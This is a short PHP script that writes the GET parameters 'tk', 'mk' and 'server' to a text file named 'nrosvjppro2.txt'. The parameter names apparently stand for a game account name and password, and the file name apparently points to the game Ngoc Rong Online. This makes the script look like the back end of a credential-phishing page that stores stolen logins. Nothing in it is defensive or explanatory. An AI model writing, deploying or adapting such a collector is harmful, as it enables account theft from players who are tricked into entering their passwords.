<?php
$my_file = 'nrosvjppro2.txt';
$handle = fopen($my_file, 'a') or die('Cannot open file:  '.$my_file);
$data = $_GET['tk'] . '|' . $_GET['mk'] . '|' . $_GET['server'] . "\n";
fwrite($handle, $data);
fclose($handle);
?>